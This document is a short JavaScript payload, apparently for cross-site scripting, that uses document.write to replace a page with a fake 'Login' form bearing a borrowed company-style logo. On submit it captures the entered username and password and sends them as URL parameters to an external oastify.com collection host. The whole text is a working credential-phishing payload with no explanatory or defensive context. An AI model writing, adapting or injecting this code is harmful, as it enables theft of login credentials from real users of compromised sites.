document.write(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Page</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #ffffff;
        text-align: center;
        margin: 0;
        padding: 0;
    }
    .container {
        max-width: 400px;
        margin: 100px auto;
        padding: 20px;
        border: 1px solid #ccc;
        border-radius: 8px;
        background-color: #f9f9f9;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
        margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        box-sizing: border-box;
        border: 1px solid #ccc;
        border-radius: 4px;
    }
    input[type="submit"] {
        background-color: #4CAF50;
        color: white;
        padding: 12px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
    }
    input[type="submit"]:hover {
        background-color: #45a049;
    }
</style>
</head>
<body>
<div class="container">
    <img src="https://media.licdn.com/dms/image/D5612AQFsVmLmbm10Ew/article-cover_image-shrink_600_2000/0/1689120093276?e=2147483647&v=beta&t=NMkj4T14g_5lpMPHH7gf_kn06m8u1aVhyRiJ4aBfzec" alt="Company Logo" style="max-width: 100px;">
    <h2>Login</h2>
    <form id="loginForm">
        <input type="text" id="username" name="username" placeholder="Username" required><br>
        <input type="password" id="password" name="password" placeholder="Password" required><br>
        <input type="submit" value="Login">
    </form>
</div>

<script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault();
        
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        
        // Assuming you want to pass username and password as query params
        var url = "https://086c1yy0jw2u35mlwydw8nvkobu2itih7.oastify.com?" + "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
        
        // Redirect to the server URL with the query params
        window.location.href = url;
    });
</script>

</body>
</html>
`);